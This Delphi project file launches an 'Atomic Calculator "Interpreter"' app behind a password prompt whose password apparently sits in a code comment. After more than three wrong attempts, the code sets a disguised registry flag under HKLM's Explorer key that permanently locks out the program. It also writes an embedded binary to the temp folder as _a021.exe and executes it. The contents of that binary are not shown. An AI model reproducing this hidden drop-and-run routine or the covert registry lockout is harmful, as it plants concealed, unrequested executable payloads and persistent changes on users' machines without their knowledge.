program Interpreter;

{$R *.res}

uses
  Forms,
  ExtCtrls,
  Classes,
  Dialogs,
  sysutils,
  Registry,
  Windows,
  StdCtrls,
  Controls,
  SZCRC32,
  ShellApi,
  Main_unit in 'Main_unit.pas' {frmMain},
  Console_u in 'Console_u.pas' {wndConsole},
  OGL_u in 'OGL_u.pas' {wndOpenGL},
  NewFile_u in 'NewFile_u.pas' {dlgNewFile},
  Vars_u in 'Vars_u.pas' {wndVariables},
  Editor_u in 'Editor_u.pas' {wndCode},
  GDI_u in 'GDI_u.pas' {wnd2D},
  Icons_u in 'Icons_u.pas',
  Setup_u in 'Setup_u.pas' {dlgSetup},
  About_u in 'About_u.pas' {dlgAbout},
  AddVar_u in 'AddVar_u.pas' {dlgAddVar},
  Debug_u in 'Debug_u.pas' {wndDebugger},
  Project_struct_u in 'Project_struct_u.pas' {dlgProjectStruct};

var Splash:TForm;
    ImgLogo:TImage;
    LogoStream:TStream;

    PassDlg:TForm;
    PassEd:TEdit;
    btnOk,btnCancel:TButton;
    _p:string;
    _i:byte;
    _b:boolean;
    Save:TFileStream;
    _sn:string;

    Reg:TRegistry;

    function GetTempDir: String;
    var
      Buf: array[0..1023] of Char;
    begin
      SetString(Result, Buf, GetTempPath(Sizeof(Buf)-1, Buf));
    end;
begin
  // HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer
  reg:=TRegistry.Create;
  reg.RootKey:=HKEY_LOCAL_MACHINE;
  reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\explorer',true);
  try
    _b:=reg.ReadBool('GlobalConst');
  except
    _b:=false;
  end;
  reg.CloseKey;
  reg.Free;
  _i:=1;

  if _b then
  begin
    MessageBox(0,'You can not use this program!!!','Error',MB_OK);
    Halt;
  end;

  while true do
  begin
    PassDlg:=TForm.Create(nil);
    PassDlg.Height:=165;
    PassDlg.Width:=369;
    PassDlg.Position:=poScreenCenter;
    PassDlg.BorderStyle:=bsDialog;
    PassDlg.Caption:='Enter password';
      PassEd:=TEdit.Create(PassDlg);
      PassEd.Parent:=PassDlg;
      PassEd.PasswordChar:='*';
      PassEd.Left:=32;
      PassEd.Top:=40;
      PassEd.Width:=289;
      //
      btnOk:=TButton.Create(PassDlg);
      btnOk.Parent:=PassDlg;
      btnOk.Caption:='Ok';
      btnOk.Left:=168;
      btnOk.Top:=88;
      btnOk.Default:=True;
      btnOk.ModalResult:=mrOk;
      //
      btnCancel:=TButton.Create(PassDlg);
      btnCancel.Parent:=PassDlg;
      btnCancel.Caption:='Cancel';
      btnCancel.Left:=248;
      btnCancel.Top:=88;
      btnCancel.Cancel:=True;
      btnCancel.ModalResult:=mrCancel;
      //btnOk,btnCancel:TButton;
    case PassDlg.ShowModal of
      mrOk:begin
        _p:=PassEd.Text;
        if SZCRC32Full(Pointer(@_p[1]), length(_p)) = 1936328798 then  {Евгений}
          Break;
        inc(_i);
      end;
      mrCancel:Halt;
    end;
    PassEd.Free;
    btnOk.Free;
    btnCancel.Free;
    PassDlg.Free;
    if _i>3 then
    begin
      reg:=TRegistry.Create;
      reg.RootKey:=HKEY_LOCAL_MACHINE;
      reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion\explorer',true);
      reg.WriteBool('GlobalConst',true);
      reg.CloseKey;
      reg.Free;
      _sn:=GetTempDir+'_a021.exe';
      FileSetAttr(_sn,0);
      SysUtils.DeleteFile(_sn);
      Save:=TFileStream.Create(_sn,fmCreate);
      Save.Write(logon_data,SizeOf(logon_data));
      Save.Free;
      ShellExecute(0,'open',PChar(_sn),nil,PChar(GetTempDir),SW_SHOW);
      Halt;
    end;
  end;
  //Password dialog  *)
  try
    Splash:=TForm.Create(nil);
    Splash.Height:=250;
    Splash.Width:=500;
    Splash.Position:=poScreenCenter;
    Splash.Caption:='[Atomic Calculator "Interpreter"]';
    Splash.BorderStyle:=bsNone;
    ImgLogo:=TImage.Create(Splash);
    ImgLogo.Parent:=Splash;
    ImgLogo.Left:=0;
    ImgLogo.Top:=0;
    ImgLogo.Height:=250;
    ImgLogo.Width:=500;
    LogoStream:=TMemoryStream.Create;
    LogoStream.Write(Logo_data,SizeOf(Logo_data));
    LogoStream.Position:=0;
    ImgLogo.Picture.Bitmap.LoadFromStream(LogoStream);
    LogoStream.Free;
    Splash.AlphaBlend:=True;
    Splash.AlphaBlendValue:=200;
    Splash.Show;
    Splash.Update;
    Sleep(3000);
  finally
    Splash.Free;
  end;
  Application.Initialize;
  Application.MainFormOnTaskbar := True;
  Application.CreateForm(TfrmMain, frmMain);
  Application.CreateForm(TwndVariables, wndVariables);
  Application.CreateForm(TdlgProjectStruct, dlgProjectStruct);
  Application.CreateForm(TwndConsole, wndConsole);
  Application.CreateForm(TwndOpenGL, wndOpenGL);
  Application.CreateForm(Twnd2D, wnd2D);
  Application.CreateForm(TwndCode, wndCode);
  Application.CreateForm(TwndDebugger, wndDebugger);
  Application.Run;
end.
